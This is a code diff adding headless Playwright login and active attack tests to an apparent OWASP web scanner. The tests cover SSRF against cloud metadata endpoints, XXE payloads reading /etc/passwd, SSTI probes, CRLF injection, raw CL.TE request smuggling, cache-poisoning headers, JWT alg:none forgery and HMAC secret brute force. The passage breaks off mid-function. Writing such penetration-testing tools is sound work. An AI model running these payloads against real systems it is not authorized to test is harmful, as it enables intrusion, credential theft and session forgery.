@@ -93,6 +93,12 @@ try:
     HAS_TQDM = True
 except ImportError:
     HAS_TQDM = False
+
+try:
+    from playwright.sync_api import sync_playwright
+    HAS_PLAYWRIGHT = True
+except ImportError:
+    HAS_PLAYWRIGHT = False
     class tqdm:
         def __init__(self, iterable=None, total=None, **kwargs):
             self.iterable = iterable
@@ -121,7 +127,7 @@ BANNER = r"""
 """
 DESCRIPTION = "OWASP Web Security Testing Scanner"
 DEVELOPER = "developed by @afsh4ck"
-VERSION = "1.2.0"
+VERSION = "1.3.0"
 
 # ========== CONFIGURACIÓN ==========
 DEFAULT_TIMEOUT = 10
@@ -152,6 +158,7 @@ SCAN_DATA = {
     "wordpress": {},
     "spider": {},
     "source_code_analysis": {},
+    "advanced_security": {},
     "stats": {},
 }
 
@@ -3459,7 +3466,37 @@ def setup_authentication():
     if status == "invalid":
         print_error("Credenciales inválidas: el formulario rechazó usuario/contraseña.")
     else:
-        print_warning("No se detectó un formulario de login válido en la URL indicada.")
+        print_warning("No se detectó formulario HTML de login (posible SPA / OAuth2).")
+        # 3. Intentar login headless con Playwright.
+        if not check_playwright():
+            print_warning("Playwright no instalado. Instalar para soportar SPAs/OAuth2: pip install playwright && playwright install chromium")
+            print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Instalar Playwright ahora? [s/N]:")
+            if input("> ").strip().lower() == 's':
+                if install_playwright():
+                    # Reimportar tras instalacion.
+                    try:
+                        from playwright.sync_api import sync_playwright as _spw
+                        globals()["sync_playwright"] = _spw
+                        globals()["HAS_PLAYWRIGHT"] = True
+                    except Exception:
+                        pass
+        if HAS_PLAYWRIGHT:
+            print_info("Intentando login headless con Playwright...")
+            cookies_dict, final_url = _attempt_headless_login(login_url, identifier, password, user_agent)
+            if cookies_dict:
+                headless_session = get_session(user_agent)
+                _apply_playwright_cookies_to_session(headless_session, cookies_dict, TARGET_URL)
+                verify = _verify_authenticated_session(headless_session, identifier)
+                if verify is not None and not _response_has_login_form(verify):
+                    print_good(f"Login headless exitoso (Playwright). URL final: {final_url}")
+                    AUTH_SESSION = headless_session
+                    AUTHENTICATED = True
+                    _record_auth_context("headless-playwright", login_url, identifier, headless_session, response=verify)
+                    return
+                else:
+                    print_error("Login headless: cookies obtenidas pero la sesion no parece autenticada.")
+            else:
+                print_error("Login headless falló (no se obtuvieron cookies o no hubo redireccion post-auth).")
     _finish_fail()
 
 def get_active_session():
@@ -7476,6 +7513,841 @@ def run_active_directory_pentest(target=None):
     SCAN_DATA["active_directory"] = result
     return result
 
+# ========== HEADLESS LOGIN (PLAYWRIGHT) ==========
+
+def check_playwright():
+    return HAS_PLAYWRIGHT
+
+def install_playwright():
+    print_info("Instalando playwright y navegador Chromium...")
+    try:
+        subprocess.run([sys.executable, "-m", "pip", "install", "playwright"], check=True)
+        subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], check=True)
+        print_good("Playwright instalado correctamente.")
+        return True
+    except Exception as e:
+        print_error(f"Error instalando playwright: {e}")
+        return False
+
+def _attempt_headless_login(login_url, identifier, password, user_agent=None):
+    """Login headless con Playwright para SPAs (Angular/Vue/React) y OAuth2/OIDC.
+    Devuelve (cookies_dict, final_url) o (None, None) si falla."""
+    if not HAS_PLAYWRIGHT:
+        return None, None
+    ua = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    try:
+        with sync_playwright() as pw:
+            browser = pw.chromium.launch(headless=True, args=["--no-sandbox"])
+            ctx = browser.new_context(user_agent=ua, ignore_https_errors=not VERIFY_TLS)
+            page = ctx.new_page()
+            page.goto(login_url, wait_until="networkidle", timeout=30000)
+
+            # Espera a que aparezca algún campo de email/usuario/contraseña.
+            for sel in ["input[type='email']", "input[name*='email']", "input[name*='user']",
+                        "input[name*='login']", "input[name*='identifier']"]:
+                try:
+                    page.wait_for_selector(sel, timeout=5000)
+                    page.fill(sel, identifier)
+                    break
+                except Exception:
+                    continue
+
+            # Algunos flujos OAuth2 tienen el campo de contraseña en un segundo paso.
+            # Intentamos hacer clic en "Siguiente"/"Next"/"Continue" si no hay campo de password visible.
+            try:
+                page.wait_for_selector("input[type='password']", timeout=4000)
+            except Exception:
+                for btn_sel in [
+                    "button[type='submit']", "input[type='submit']",
+                    "button:has-text('Next')", "button:has-text('Siguiente')",
+                    "button:has-text('Continue')", "button:has-text('Continuar')",
+                    "[data-testid='next-button']",
+                ]:
+                    try:
+                        page.click(btn_sel, timeout=3000)
+                        page.wait_for_selector("input[type='password']", timeout=5000)
+                        break
+                    except Exception:
+                        continue
+
+            try:
+                page.fill("input[type='password']", password)
+            except Exception:
+                browser.close()
+                return None, None
+
+            # Enviar formulario.
+            submitted = False
+            for btn_sel in [
+                "button[type='submit']", "input[type='submit']",
+                "button:has-text('Login')", "button:has-text('Sign in')",
+                "button:has-text('Iniciar sesión')", "button:has-text('Connexion')",
+                "[data-testid='login-button']", "[data-testid='submit']",
+            ]:
+                try:
+                    page.click(btn_sel, timeout=3000)
+                    submitted = True
+                    break
+                except Exception:
+                    continue
+            if not submitted:
+                page.keyboard.press("Enter")
+
+            try:
+                page.wait_for_load_state("networkidle", timeout=10000)
+            except Exception:
+                pass
+
+            final_url = page.url
+            raw_cookies = ctx.cookies()
+            browser.close()
+
+        if not raw_cookies:
+            return None, None
+
+        # Comprueba si la URL final es distinta a la de login (redireccion post-auth).
+        from_login = urlparse(login_url).path.rstrip("/")
+        to_path = urlparse(final_url).path.rstrip("/")
+        if from_login and from_login == to_path:
+            return None, final_url  # No hubo redireccion: probablemente fallo.
+
+        cookies = {c["name"]: c["value"] for c in raw_cookies if c.get("name")}
+        return cookies, final_url
+
+    except Exception as e:
+        print_warning(f"Login headless error: {e}")
+        return None, None
+
+def _apply_playwright_cookies_to_session(session, cookies_dict, target_url=None):
+    """Carga un dict de cookies obtenidas con Playwright en la sesion requests."""
+    if not cookies_dict:
+        return
+    cookie_string = "; ".join(f"{k}={v}" for k, v in cookies_dict.items())
+    _apply_cookie_string_to_session(session, cookie_string, target_url)
+
+
+# ========== SSRF ==========
+
+SSRF_INTERNAL_TARGETS = [
+    "http://169.254.169.254/latest/meta-data/",   # AWS IMDSv1
+    "http://169.254.169.254/",
+    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
+    "http://100.100.100.200/latest/meta-data/",    # Alibaba Cloud
+    "http://127.0.0.1/",
+    "http://localhost/",
+    "http://[::1]/",
+    "http://0.0.0.0/",
+]
+
+SSRF_URL_PARAMS = [
+    "url", "uri", "path", "src", "source", "dest", "destination",
+    "redirect", "return", "callback", "next", "continue", "to",
+    "out", "view", "file", "load", "fetch", "link", "href",
+    "feed", "host", "proxy", "forward", "api",
+]
+
+SSRF_HEADERS = [
+    "X-Forwarded-For",
+    "X-Real-IP",
+    "X-Original-URL",
+    "X-Rewrite-URL",
+    "Client-IP",
+    "True-Client-IP",
+    "Referer",
+    "Origin",
+    "X-Forwarded-Host",
+]
+
+def _ssrf_payload_response_looks_internal(resp_text):
+    markers = [
+        "ami-id", "instance-id", "local-hostname", "security-credentials",
+        "computeMetadata", "serviceAccounts",
+        "root:x:", "/bin/bash", "/bin/sh",
+        "hostname", "instance",
+    ]
+    body = (resp_text or "").lower()
+    return any(m.lower() in body for m in markers)
+
+def test_ssrf(target, session, collaborator_url=None):
+    """SSRF: prueba parametros URL y cabeceras con hosts internos y metadatos cloud."""
+    results = []
+    print_info("Probando SSRF via parametros URL...")
+    # 1. Parametros GET con SSRF payloads.
+    base = target.rstrip("/")
+    for param in SSRF_URL_PARAMS:
+        for payload in SSRF_INTERNAL_TARGETS[:4]:  # limitar a mas criticos
+            test_url = f"{base}?{param}={payload}"
+            try:
+                resp = session.get(test_url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
+                if resp.status_code == 200 and _ssrf_payload_response_looks_internal(resp.text):
+                    msg = f"SSRF confirmado: parametro '{param}' devuelve datos internos ({payload[:40]})"
+                    print_vuln(msg)
+                    results.append({"type": "ssrf", "param": param, "payload": payload,
+                                    "url": test_url, "status": resp.status_code})
+                    FINDINGS.append({"name": "SSRF", "detail": msg, "severity": "critical"})
+                elif resp.status_code == 200 and len(resp.text) > 50:
+                    # Respuesta inesperada (posible SSRF sin marcadores conocidos).
+                    if collaborator_url:
+                        oob_url = f"{base}?{param}={collaborator_url}"
+                        try:
+                            session.get(oob_url, timeout=DEFAULT_TIMEOUT)
+                            print_info(f"SSRF OOB enviado via '{param}' a {collaborator_url} — verifica el listener")
+                        except Exception:
+                            pass
+            except requests.RequestException:
+                pass
+
+    # 2. Cabeceras con IPs internas.
+    print_info("Probando SSRF via cabeceras HTTP...")
+    for header in SSRF_HEADERS:
+        for internal in ["127.0.0.1", "169.254.169.254", "metadata.google.internal"]:
+            try:
+                resp = session.get(target, headers={header: internal}, timeout=DEFAULT_TIMEOUT)
+                if resp.status_code == 200 and _ssrf_payload_response_looks_internal(resp.text):
+                    msg = f"SSRF via cabecera '{header}: {internal}' devuelve datos internos"
+                    print_vuln(msg)
+                    results.append({"type": "ssrf-header", "header": header, "value": internal,
+                                    "status": resp.status_code})
+                    FINDINGS.append({"name": "SSRF (header)", "detail": msg, "severity": "critical"})
+            except requests.RequestException:
+                pass
+
+    if not results:
+        print_info("Sin indicios de SSRF en los vectores probados.")
+    return results
+
+
+# ========== SSTI ==========
+
+SSTI_PROBES = [
+    # (payload, expected_in_response, engine_hint)
+    ("{{7*7}}", "49", "Jinja2/Twig/Nunjucks"),
+    ("${7*7}", "49", "FreeMarker/Thymeleaf EL"),
+    ("#{7*7}", "49", "Ruby/Pebble"),
+    ("<%= 7*7 %>", "49", "ERB/EJS"),
+    ("{{7*'7'}}", "7777777", "Twig"),
+    ("${{7*7}}", "49", "Pebble"),
+    ("%{{7*7}}", "49", "Tornado/Mako"),
+    ("[[7*7]]", "49", "Thymeleaf"),
+]
+
+SSTI_ERROR_MARKERS = [
+    "TemplateSyntaxError", "UndefinedError", "jinja2", "Twig_Error",
+    "FreeMarker", "template error", "Smarty", "velocity",
+    "thymeleaf", "pebble", "jade", "handlebars", "mustache",
+]
+
+def test_ssti(url, param, session, method="GET"):
+    """SSTI detection via math probes. Devuelve True si confirma vulnerabilidad."""
+    for payload, expected, engine in SSTI_PROBES:
+        try:
+            if method == "GET":
+                from urllib.parse import quote
+                resp = session.get(f"{url}?{param}={quote(payload)}", timeout=DEFAULT_TIMEOUT)
+            else:
+                resp = session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT)
+            body = resp.text or ""
+            if expected in body:
+                msg = f"SSTI confirmado ({engine}) en parametro '{param}' — payload '{payload}' -> '{expected}' en respuesta"
+                print_vuln(msg)
+                FINDINGS.append({"name": "SSTI", "detail": msg, "severity": "critical",
+                                  "url": url, "param": param, "engine": engine})
+                return True
+            if any(marker.lower() in body.lower() for marker in SSTI_ERROR_MARKERS):
+                msg = f"SSTI probable (error de template) en '{param}' con payload '{payload}'"
+                print_warning(msg)
+                FINDINGS.append({"name": "SSTI (error)", "detail": msg, "severity": "high",
+                                  "url": url, "param": param})
+                return True
+        except requests.RequestException:
+            pass
+    return False
+
+
+# ========== XXE ==========
+
+XXE_PAYLOADS = [
+    (
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>',
+        ["root:x:", "daemon:", "/bin/bash"],
+    ),
+    (
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root><data>&xxe;</data></root>',
+        None,  # cualquier respuesta distinta al XML normal puede ser positiva
+    ),
+    (
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://169.254.169.254/">%dtd;]><root/>',
+        ["ami-id", "instance-id", "local-hostname"],
+    ),
+]
+
+XXE_CONTENT_TYPES = [
+    "application/xml",
+    "text/xml",
+    "application/soap+xml",
+]
+
+def _find_xml_endpoints(target, session, found_endpoints):
+    """Devuelve URLs que aceptan XML (por Content-Type o extension)."""
+    candidates = list(found_endpoints or [])
+    for suffix in ["/xmlrpc.php", "/soap", "/api/xml", "/ws", "/service.asmx", "/api/v1/xml"]:
+        candidates.append(urljoin(target, suffix))
+    xml_endpoints = []
+    for url in candidates[:20]:
+        for ct in XXE_CONTENT_TYPES:
+            try:
+                resp = session.post(url, data="<test/>", headers={"Content-Type": ct},
+                                    timeout=DEFAULT_TIMEOUT)
+                # Si no devuelve 404/405/415 es candidato.
+                if resp.status_code not in (404, 405, 415):
+                    xml_endpoints.append((url, ct))
+                    break
+            except requests.RequestException:
+                pass
+    return xml_endpoints
+
+def test_xxe(target, session, found_endpoints=None):
+    """XXE: inyeccion en endpoints que aceptan XML."""
+    results = []
+    xml_eps = _find_xml_endpoints(target, session, found_endpoints or [])
+    if not xml_eps:
+        print_info("Sin endpoints XML detectados para probar XXE.")
+        return results
+    print_info(f"Probando XXE en {len(xml_eps)} endpoint(s) XML...")
+    for endpoint_url, content_type in xml_eps:
+        for payload, markers in XXE_PAYLOADS:
+            try:
+                resp = session.post(endpoint_url, data=payload,
+                                    headers={"Content-Type": content_type},
+                                    timeout=DEFAULT_TIMEOUT)
+                body = resp.text or ""
+                if markers:
+                    if any(m in body for m in markers):
+                        msg = f"XXE confirmado en {endpoint_url} (Content-Type: {content_type})"
+                        print_vuln(msg)
+                        results.append({"url": endpoint_url, "content_type": content_type,
+                                        "payload": payload[:80]})
+                        FINDINGS.append({"name": "XXE", "detail": msg, "severity": "critical"})
+                        break
+                elif len(body) > 10 and body.strip() not in ("<root/>", "", "<root></root>"):
+                    msg = f"XXE posible en {endpoint_url} — respuesta inesperada con entidad externa"
+                    print_warning(msg)
+                    results.append({"url": endpoint_url, "content_type": content_type,
+                                    "payload": payload[:80], "note": "respuesta inesperada"})
+            except requests.RequestException:
+                pass
+    if not results:
+        print_info("Sin indicios de XXE en los endpoints probados.")
+    return results
+
+
+# ========== CRLF ==========
+
+CRLF_PAYLOADS = [
+    "%0d%0aSet-Cookie%3Acrlf_test%3Dinjected",
+    "%0aSet-Cookie%3Acrlf_test%3Dinjected",
+    "%0d%0aX-CRLF-Test%3A injected",
+    "/%0d%0aSet-Cookie%3Acrlf_test%3Dinjected",
+    "%E5%98%8D%E5%98%8ASet-Cookie%3Acrlf_test%3Dinjected",  # doble encode unicode
+]
+
+def test_crlf(target, session):
+    """CRLF injection / HTTP Response Splitting en parametros y rutas."""
+    results = []
+    print_info("Probando inyeccion CRLF...")
+    base_parsed = urlparse(target)
+
+    for payload in CRLF_PAYLOADS:
+        # En path.
+        injected_url = f"{target}/{payload}"
+        try:
+            resp = session.get(injected_url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
+            resp_headers_lower = {k.lower(): v for k, v in resp.headers.items()}
+            if "crlf_test" in resp_headers_lower or "set-cookie" in str(resp.headers).lower() and "crlf_test" in str(resp.headers).lower():
+                msg = f"CRLF confirmado en path: {injected_url[:80]}"
+                print_vuln(msg)
+                results.append({"vector": "path", "payload": payload, "url": injected_url})
+                FINDINGS.append({"name": "CRLF Injection", "detail": msg, "severity": "high"})
+        except requests.RequestException:
+            pass
+
+        # En parametro 'url' / 'redirect'.
+        for param in ["url", "redirect", "next", "return", "r"]:
+            test_url = f"{target}?{param}=https://example.com{payload}"
+            try:
+                resp = session.get(test_url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
+                if "crlf_test" in str(resp.headers).lower():
+                    msg = f"CRLF confirmado via parametro '{param}': {test_url[:80]}"
+                    print_vuln(msg)
+                    results.append({"vector": "param", "param": param, "payload": payload})
+                    FINDINGS.append({"name": "CRLF Injection", "detail": msg, "severity": "high"})
+            except requests.RequestException:
+                pass
+
+    if not results:
+        print_info("Sin indicios de CRLF en los vectores probados.")
+    return results
+
+
+# ========== HTTP REQUEST SMUGGLING ==========
+
+def check_smuggler():
+    return bool(shutil.which("smuggler") or shutil.which("smuggler.py") or
+                os.path.exists(os.path.join(os.path.expanduser("~"), "smuggler", "smuggler.py")))
+
+def _find_smuggler_path():
+    for p in ["smuggler", "smuggler.py",
+              os.path.join(os.path.expanduser("~"), "smuggler", "smuggler.py")]:
+        if shutil.which(p) or os.path.exists(p):
+            return p
+    return None
+
+def test_request_smuggling(target, session):
+    """HTTP Request Smuggling: usa smuggler si esta disponible, sino prueba manual CL.TE / TE.CL."""
+    results = []
+    smuggler = _find_smuggler_path()
+    if smuggler:
+        print_info(f"Usando smuggler.py para HTTP Request Smuggling...")
+        try:
+            cmd = ["python3", smuggler, "-u", target, "-t", str(DEFAULT_TIMEOUT), "-q"]
+            if smuggler == "smuggler":
+                cmd = ["smuggler", "-u", target, "-t", str(DEFAULT_TIMEOUT), "-q"]
+            out = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+            output = (out.stdout or "") + (out.stderr or "")
+            if any(x in output.lower() for x in ["vulnerable", "smuggl", "clte", "tecl", "found"]):
+                msg = f"HTTP Request Smuggling detectado por smuggler.py en {target}"
+                print_vuln(msg)
+                results.append({"tool": "smuggler", "output_snippet": output[:300]})
+                FINDINGS.append({"name": "HTTP Request Smuggling", "detail": msg, "severity": "critical"})
+            else:
+                print_info("smuggler.py no encontro indicios de smuggling.")
+        except subprocess.TimeoutExpired:
+            print_warning("smuggler.py timeout.")
+        except Exception as e:
+            print_warning(f"smuggler.py error: {e}")
+    else:
+        print_info("smuggler.py no encontrado. Prueba manual de CL.TE / TE.CL...")
+        # Prueba manual CL.TE con un socket raw.
+        parsed = urlparse(target)
+        host = parsed.hostname
+        port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        use_tls = parsed.scheme == "https"
+        path = parsed.path or "/"
+        # Payload CL.TE: Content-Length dice 6, Transfer-Encoding: chunked, body chunked con 0 termina antes.
+        smuggle_req = (
+            f"POST {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Content-Length: 6\r\n"
+            f"Transfer-Encoding: chunked\r\n"
+            f"\r\n"
+            f"0\r\n"
+            f"\r\n"
+            f"G"
+        ).encode()
+        try:
+            sock = socket.create_connection((host, port), timeout=DEFAULT_TIMEOUT)
+            if use_tls:
+                ctx = ssl.create_default_context()
+                if not VERIFY_TLS:
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                sock = ctx.wrap_socket(sock, server_hostname=host)
+            sock.sendall(smuggle_req)
+            resp_raw = b""
+            sock.settimeout(5)
+            try:
+                while True:
+                    chunk = sock.recv(1024)
+                    if not chunk:
+                        break
+                    resp_raw += chunk
+            except socket.timeout:
+                pass
+            sock.close()
+            resp_text = resp_raw.decode("utf-8", errors="ignore")
+            if "400" in resp_text and ("bad request" in resp_text.lower() or "invalid" in resp_text.lower()):
+                print_info("CL.TE: servidor devolvio 400 — posible deteccion del conflicto (revisar manualmente).")
+                results.append({"type": "clte-400", "note": "posible smuggling, verificar con smuggler.py"})
+            else:
+                print_info("Sin respuesta anomala en prueba manual CL.TE.")
+        except Exception as e:
+            print_warning(f"No se pudo hacer prueba manual de smuggling: {e}")
+        print_info("Para analisis completo: pip install requests && git clone https://github.com/defparam/smuggler")
+
+    if not results:
+        print_info("Sin indicios de HTTP Request Smuggling confirmados.")
+    return results
+
+
+# ========== CACHE POISONING ==========
+
+CACHE_POISON_HEADERS = [
+    ("X-Forwarded-Host", "evil-canary-{rand}.com"),
+    ("X-Host", "evil-canary-{rand}.com"),
+    ("X-Forwarded-Scheme", "http"),
+    ("X-Original-URL", "/admin-canary-{rand}"),
+    ("X-Rewrite-URL", "/admin-canary-{rand}"),
+    ("X-Forwarded-Server", "evil-canary-{rand}.com"),
+    ("Forwarded", "host=evil-canary-{rand}.com"),
+]
+
+def test_cache_poisoning(target, session):
+    """Cache Poisoning: inyecta cabeceras de control y comprueba reflexion en respuesta cacheada."""
+    results = []
+    print_info("Probando Cache Poisoning via cabeceras no-standard...")
+    import random, string
+    rand_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
+
+    for header_tpl, value_tpl in CACHE_POISON_HEADERS:
+        value = value_tpl.replace("{rand}", rand_id)
+        try:
+            # Primera peticion: inyectamos la cabecera.
+            resp1 = session.get(target, headers={header_tpl: value},
+                                timeout=DEFAULT_TIMEOUT, allow_redirects=True)
+            body1 = resp1.text or ""
+            # Segunda peticion sin la cabecera: si el valor inyectado aparece, hubo cache poisoning.
+            resp2 = session.get(target, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
+            body2 = resp2.text or ""
+
+            reflected_in_1 = rand_id in body1 or value in body1
+            reflected_in_2 = rand_id in body2 or value in body2
+
+            if reflected_in_1 and reflected_in_2:
+                msg = f"Cache Poisoning confirmado via '{header_tpl}: {value}' — valor inyectado persiste en respuesta sin cabecera"
+                print_vuln(msg)
+                results.append({"header": header_tpl, "value": value, "confirmed": True})
+                FINDINGS.append({"name": "Cache Poisoning", "detail": msg, "severity": "high"})
+            elif reflected_in_1:
+                msg = f"Cache Poisoning posible — '{header_tpl}: {value}' se refleja en la respuesta con la cabecera presente"
+                print_warning(msg)
+                results.append({"header": header_tpl, "value": value, "confirmed": False, "reflected": True})
+                FINDINGS.append({"name": "Cache Poisoning (reflected)", "detail": msg, "severity": "medium"})
+        except requests.RequestException:
+            pass
+
+    # Cabecera X-Cache / Age para comprobar si el objetivo usa cache.
+    try:
+        resp = session.get(target, timeout=DEFAULT_TIMEOUT)
+        cache_headers = {k.lower(): v for k, v in resp.headers.items()}
+        cache_active = bool(cache_headers.get("x-cache") or cache_headers.get("age") or
+                            cache_headers.get("cf-cache-status") or cache_headers.get("x-varnish"))
+        if not cache_active:
+            print_info("No se detectaron cabeceras de cache (X-Cache/Age/CF-Cache-Status). El objetivo puede no usar cache publica.")
+    except Exception:
+        pass
+
+    if not results:
+        print_info("Sin indicios de Cache Poisoning en los vectores probados.")
+    return results
+
+
+# ========== JWT AVANZADO ==========
+
+def _b64_decode_jwt(s):
+    s += "=" * (4 - len(s) % 4)
+    return json.loads(base64.urlsafe_b64decode(s).decode("utf-8", errors="ignore"))
+
+def _b64_encode_jwt(data):
+    return base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode()).rstrip(b"=").decode()
+
+def _jwt_forge_alg_none(token):
+    """Genera version del token con alg:none y sin firma."""
+    parts = token.split(".")
+    if len(parts) != 3:
+        return None
+    header = _b64_decode_jwt(parts[0])
+    header["alg"] = "none"
+    return f"{_b64_encode_jwt(header)}.{parts[1]}."
+
+def _jwt_test_alg_none(target, session, token, header_name="Authorization", prefix="Bearer"):
+    """Envia el token con alg:none y comprueba si el servidor lo acepta."""
+    forged = _jwt_forge_alg_none(token)
+    if not forged:
+        return False
+    test_headers = {header_name: f"{prefix} {forged}"}
+    try:
+        r1 = session.get(target, timeout=DEFAULT_TIMEOUT)
+        r2 = session.get(target, headers=test_headers, timeout=DEFAULT_TIMEOUT)
+        # Si la respuesta con alg:none tiene el mismo contenido que la autenticada, es vulnerable.
+        if r2.status_code == r1.status_code and r2.status_code not in (401, 403):
+            return True
+    except Exception:
+        pass
+    return False
+
+def _jwt_brute_secret(token, wordlist=None):
+    """Brute force de secreto HMAC con una wordlist pequeña. Devuelve el secreto si lo encuentra."""
+    try:
+        import hmac as _hmac
+        import hashlib as _hashlib
+    except ImportError:
+        return None
+    parts = token.split(".")
+    if len(parts) != 3:
+        return None
+    message = f"{parts[0]}.{parts[1]}".encode()
+    sig = base64.urlsafe_b64decode(parts[2] + "==")
+    alg_map = {"HS256": _hashlib.sha256, "HS384": _hashlib.sha384, "HS512": _hashlib.sha512}
+    try:
+        header = _b64_decode_jwt(parts[0])
+        alg = header.get("alg", "HS256")
+        hash_func = alg_map.get(alg)
+        if not hash_func:
+            return None
+    except Exception:
+        return None
+
+    default_secrets = [
+        "secret", "password", "123456", "changeme", "admin", "test",
+        "supersecret", "jwt_secret", "app_secret", "mysecret", "",
+        "your-256-bit-secret", "your-secret", "secretkey", "key",
+    ]
+    words = default_secrets[:]
+    if wordlist and os.path.exists(wordlist):
+        try:
+            with open(wordlist, "r", errors="ignore") as f:
+                words += [line.strip() for line in f if line.strip()][:2000]
+        except Exception:
+            pass
+
+    for word in words:
+        try:
+            expected = _hmac.new(word.encode(), message, hash_func).digest()
+            if expected == sig:
+                return word
+        except Exception:
+            pass
+    return None
+
+def test_jwt_tokens(target, session):
+    """JWT: deteccion, analisis, alg:none, RS256->HS256, kid path traversal, brute force de secreto."""
+    try:
+        resp = session.get(target, timeout=DEFAULT_TIMEOUT)
+        jwt_regex = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
+        jwt_candidates = set()
+        # Buscar en cabeceras.
+        for header_val in resp.headers.values():
+            jwt_candidates.update(jwt_regex.findall(header_val))
+        # Buscar en cookies.
+        for cookie in resp.cookies:
+            jwt_candidates.update(jwt_regex.findall(cookie.value))
+        # Buscar en la sesion activa (si hay token Bearer).
+        auth_header = _session_header_value(session, "Authorization")
+        if auth_header:
+            jwt_candidates.update(jwt_regex.findall(auth_header))
+
+        if not jwt_candidates:
+            print_info("Sin JWT detectados en cabeceras/cookies de la pagina principal.")
+            return
+
+        for jwt in jwt_candidates:
+            try:
+                parts = jwt.split(".")
+                if len(parts) < 3:
+                    continue
+                header_data = _b64_decode_jwt(parts[0])
+                payload_data = _b64_decode_jwt(parts[1])
+                alg = header_data.get("alg", "").upper()
+                kid = header_data.get("kid", "")
+                print_info(f"JWT detectado — alg: {alg}  kid: {kid or 'N/A'}")
+
+                # alg:none activo.
+                if alg in ("NONE", ""):
+                    msg = "JWT con alg:none — firma ignorada completamente"
+                    print_vuln(msg)
+                    FINDINGS.append({"name": "JWT alg:none", "detail": msg, "severity": "critical"})
+
+                # Intentar alg:none bypass.
+                elif _jwt_test_alg_none(target, session, jwt):
+                    msg = "JWT alg:none bypass confirmado — el servidor acepta tokens sin firma"
+                    print_vuln(msg)
+                    FINDINGS.append({"name": "JWT alg:none bypass", "detail": msg, "severity": "critical"})
+                else:
+                    print_info(f"  alg:none bypass: no aceptado (correcto).")
+
+                # RS256 -> HS256 key confusion (advertencia).
+                if alg in ("RS256", "RS384", "RS512"):
+                    msg = f"JWT RSA ({alg}): revisar confusion RS256->HS256 con la clave publica del servidor"
+                    print_warning(msg)
+                    FINDINGS.append({"name": "JWT RS256->HS256 confusion", "detail": msg, "severity": "high"})
+
+                # kid path traversal.
+                if kid:
+                    dangerous_kid = any(c in kid for c in ("..", "/", "\\", "file:"))
+                    if dangerous_kid:
+                        msg = f"JWT kid sospechoso de path traversal: '{kid}'"
+                        print_vuln(msg)
+                        FINDINGS.append({"name": "JWT kid path traversal", "detail": msg, "severity": "high"})
+                    elif "sql" in kid.lower() or "'" in kid or '"' in kid:
+                        msg = f"JWT kid con posible SQLi: '{kid}'"
+                        print_warning(msg)
+                        FINDINGS.append({"name": "JWT kid SQLi", "detail": msg, "severity": "high"})
+
+                # Brute force secreto HMAC.
+                if alg in ("HS256", "HS384", "HS512"):
+                    print_info(f"  Intentando brute force de secreto HMAC ({alg})...")
+                    found_secret = _jwt_brute_secret(jwt)
+                    if found_secret is not None:
+                        msg = f"JWT secreto HMAC debil encontrado: '{found_secret}'"
+                        print_vuln(msg)
+                        FINDINGS.append({"name": "JWT weak secret", "detail": msg, "severity": "critical"})
+                    else:
+                        print_info("  Secreto no encontrado en wordlist reducida (revisar manualmente con hashcat).")
+
+                # Campos de privilegio expuestos.
+                sensitive_keys = {"admin", "role", "is_admin", "permission", "privilege", "scope", "group", "groups"}
+                exposed = [k for k in payload_data if k.lower() in sensitive_keys]
+                if exposed:
+                    msg = f"JWT expone campos de privilegio: {exposed} = {[payload_data[k] for k in exposed]}"
+                    print_warning(msg)
+                    FINDINGS.append({"name": "JWT sensitive fields", "detail": msg, "severity": "medium"})
+
+                # Token caducado pero aceptado.
+                exp = payload_data.get("exp")
+                if exp and exp < time.time():
+                    try:
+                        r_expired = session.get(target, timeout=DEFAULT_TIMEOUT)
+                        if r_expired.status_code not in (401, 403):
+                            msg = "JWT caducado todavia aceptado por el servidor"
+                            print_vuln(msg)
+                            FINDINGS.append({"name": "JWT expired accepted", "detail": msg, "severity": "medium"})
+                    except Exception:
+                        pass
+
+            except Exception:
+                pass
+    except Exception as e:
+        print_error(f"Error en test JWT: {e}")
+
+
+# ========== RATE LIMITING MEJORADO ==========
+
+def test_api_rate_limiting(target, session):
+    """Rate limiting: 429, soft-block (retrasos), captcha y ban por IP."""
+    candidates = [
+        urljoin(target, "/api/v1/login"),
+        urljoin(target, "/api/login"),
+        urljoin(target, "/api/auth"),
+        urljoin(target, "/login"),
+    ]
+    for test_url in candidates:
+        statuses = []
+        times = []
+        body_samples = []
+        try:
+            for i in range(25):
+                t0 = time.time()
+                try:
+                    resp = session.post(test_url, json={"username": "test", "password": "test"},
+                                        timeout=DEFAULT_TIMEOUT)
+                    elapsed = time.time() - t0
+                    statuses.append(resp.status_code)
+                    times.append(elapsed)
+                    body_samples.append((resp.status_code, resp.text[:200]))
+                    if resp.status_code in (429, 503):
+                        break
+                except requests.RequestException:
+                    break
+            if not statuses:
+                continue
+
+            if 429 in statuses:
+                idx = statuses.index(429)
+                msg = f"Rate limiting activo (HTTP 429) en {test_url} tras {idx+1} peticiones"
+                print_good(msg)
+                FINDINGS.append({"name": "Rate limiting OK", "detail": msg, "severity": "info"})
+                return
+
+            if 503 in statuses:
+                print_good(f"Posible rate limiting via 503 en {test_url}")
+                return
+
+            # Soft-block: deteccion de retraso progresivo.
+            if len(times) >= 10:
+                first_avg = sum(times[:5]) / 5
+                last_avg = sum(times[-5:]) / 5
+                if last_avg > first_avg * 2.5:
